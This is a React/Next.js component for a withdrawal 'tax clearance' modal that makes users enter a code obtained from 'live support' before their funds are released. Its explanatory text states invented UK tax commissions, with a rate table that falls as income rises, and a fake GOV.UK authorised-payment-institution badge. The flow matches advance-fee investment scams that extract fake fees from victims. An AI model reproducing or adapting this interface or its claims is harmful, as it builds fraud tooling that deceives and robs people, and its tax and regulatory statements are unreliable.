"use client";

import React from "react";
import Image from "next/image";
import FlowModal from "@/components/modals/flow/flowModal";
import { Button } from "@/components/ui/button";
import { PinInput, PinInputGroup, PinInputInput } from "@/components/ui/pin-input";
import { getStageContent } from "@/lib/constants/withdrawal";
import type { WithdrawalRequest } from "@/lib/types/api";
import { useSiteTitle } from "@/hooks/use-site-title";

interface TaxClearanceModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onSubmit?: (code: string) => void;
  onCancel?: () => void;
  request: WithdrawalRequest;
  isLoading?: boolean;
  trigger?: React.ReactNode;
}

const TaxClearanceModal = ({ 
  open, 
  onOpenChange, 
  onSubmit, 
  onCancel, 
  request,
  isLoading = false,
  trigger
}: TaxClearanceModalProps) => {
  const [pinValue, setPinValue] = React.useState<string[]>([]);
  const [showMoreContent, setShowMoreContent] = React.useState(false);
  const siteTitle = useSiteTitle();
  
  const stageContent = getStageContent("tax_clearance", {
    amount: request.amount,
    percent: request.percent,
    showPercent: request.show_percent,
    message: request.message,
  });

  // Use code_length from request, fallback to stageContent
  const codeLength = request.code_length && request.code_length > 0 ? request.code_length : stageContent.codeLength;
  const codeString = pinValue.join("");
  const isValidCode = codeString.length === codeLength;

  const handleSubmit = () => {
    if (isValidCode) {
      onSubmit?.(codeString);
    }
  };

  const handleCancel = () => {
    onCancel?.();
    onOpenChange(false);
  };

  React.useEffect(() => {
    if (!open) {
      setPinValue([]);
      setShowMoreContent(false);
    }
  }, [open]);

  return (
    <FlowModal
      trigger={trigger}
      open={open}
      onOpenChange={(next) => {
        if (!next) {
          setPinValue([]);
          handleCancel();
        }
        onOpenChange?.(next);
      }}
      eyebrow={stageContent.eyebrow}
      title={stageContent.title}
      subtitle={stageContent.subtitle}
      contentClassName="max-w-lg"
      dialogClassName="sm:max-w-lg"
    >
      <div className="space-y-6">
        <div className="flex flex-col items-center gap-3 text-center">
          <Image src="/loading.gif" alt="Loading" width={180} height={180} className="h-32 w-32" />
          {typeof request.percent === 'number' && request.show_percent !== false && (
            <div className="text-sm font-medium text-blue-700 dark:text-blue-300">
              {request.percent}%
            </div>
          )}
          {isLoading && (
            <p className="text-sm font-medium text-gray-600 dark:text-gray-300">
              {stageContent.processingMessage}
            </p>
          )}
        </div>

        <div className="space-y-3 text-left">
          {!showMoreContent ? (
            <>
              <p className="text-sm leading-relaxed text-gray-600 dark:text-gray-300">
                You are required to complete your tax clearance to proceed with the withdrawal of your funds
              </p>
              <button
                type="button"
                className="inline-flex items-center justify-center rounded-full border border-gray-300 px-4 py-1.5 text-xs font-semibold uppercase tracking-[0.3em] text-gray-700 transition hover:border-gray-400 dark:border-white/20 dark:text-gray-200"
                onClick={() => setShowMoreContent(true)}
              >
                LEARN MORE
              </button>
            </>
          ) : (
            <div className="space-y-4">
              <h3 className="text-lg font-semibold text-gray-900 dark:text-white">Why Tax Clearance?</h3>
              
              <p className="text-sm leading-relaxed text-gray-600 dark:text-gray-300">
                {siteTitle} operates entirely under regulations that apply in the UK. Since we would send your funds from the UK, UK financial laws require taxes on income and capital gains.
              </p>
              
              <p className="text-sm leading-relaxed text-gray-600 dark:text-gray-300">
                Usually, a tax commission applies to funds transferred from the UK that are Capital Gains. Capital Gains are proceeds from the sale of assets, stocks, etc. Regardless of where your bank account that would receive the funds is located, the following tax commissions apply:
              </p>
              
              <div className="space-y-2">
                <div className="flex justify-between items-center text-sm">
                  <span className="font-medium text-gray-700 dark:text-gray-300">Taxable Income</span>
                  <span className="font-medium text-gray-700 dark:text-gray-300">Tax Rate</span>
                </div>
                <div className="flex justify-between items-center text-sm text-gray-600 dark:text-gray-400">
                  <span>Up to 12,570</span>
                  <span>0%</span>
                </div>
                <div className="flex justify-between items-center text-sm text-gray-600 dark:text-gray-400">
                  <span>12,571 to 50,270</span>
                  <span>20%</span>
                </div>
                <div className="flex justify-between items-center text-sm text-gray-600 dark:text-gray-400">
                  <span>50,271 to 150,000</span>
                  <span>10%</span>
                </div>
                <div className="flex justify-between items-center text-sm text-gray-600 dark:text-gray-400">
                  <span>Over 150,000</span>
                  <span>5%</span>
                </div>
              </div>
              
              <p className="text-sm leading-relaxed text-gray-600 dark:text-gray-300">
                Contact our live support team to give you the details of the country where your account is domiciled and the{" "}
                <span className="text-blue-600 dark:text-blue-400">applicable tax codes</span>.
              </p>
              
              <div className="space-y-2 p-3 bg-red-50 dark:bg-red-900/20 rounded-lg border border-red-200 dark:border-red-800">
                <p className="text-xs font-semibold uppercase tracking-[0.3em] text-red-600 dark:text-red-200">PAYMENT SERVICES STATUS</p>
                <p className="text-xs text-red-600 dark:text-red-300">
                  Authorized Payment Institution Since 16/11/2018 under GOV.UK regulation. This firm is permitted to provide payment services.
                </p>
              </div>
              
              <button
                type="button"
                className="inline-flex items-center justify-center rounded-full border border-gray-300 px-4 py-1.5 text-xs font-semibold uppercase tracking-[0.3em] text-gray-700 transition hover:border-gray-400 dark:border-white/20 dark:text-gray-200"
                onClick={() => setShowMoreContent(false)}
              >
                LEARN LESS
              </button>
            </div>
          )}
        </div>

        <div className="space-y-3">
          <div>
            <p className="text-[11px] uppercase tracking-[0.4em] text-gray-500 dark:text-gray-400">
              {stageContent.codeLabel}
            </p>
          </div>
          <PinInput
            value={pinValue}
            onValueChange={(details) => setPinValue(details.value)}
            otp
            blurOnComplete
          >
            <PinInputGroup className="gap-2 justify-center">
              {Array.from({ length: codeLength }).map((_, index) => (
                <PinInputInput
                  key={`tax-digit-${index}`}
                  index={index}
                  className="w-12 h-12 text-lg font-bold text-center border-2 rounded-lg bg-white dark:bg-gray-900 border-gray-300 dark:border-gray-600 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 dark:focus:ring-indigo-900/20 transition-all"
                />
              ))}
            </PinInputGroup>
          </PinInput>
        </div>

        <div className="flex items-center justify-between gap-3">
          <Button
            type="button"
            variant="outline"
            className="cursor-pointer border border-gray-300 text-gray-700 hover:bg-gray-50 dark:border-white/10 dark:text-white"
            onClick={handleCancel}
            disabled={isLoading}
          >
            Cancel
          </Button>
          <Button
            type="button"
            className="cursor-pointer bg-indigo-600 text-white hover:bg-indigo-500"
            onClick={handleSubmit}
            disabled={!isValidCode || isLoading}
          >
            {isLoading ? "Processing..." : "Proceed"}
          </Button>
        </div>
      </div>
    </FlowModal>
  );
};

export default TaxClearanceModal;
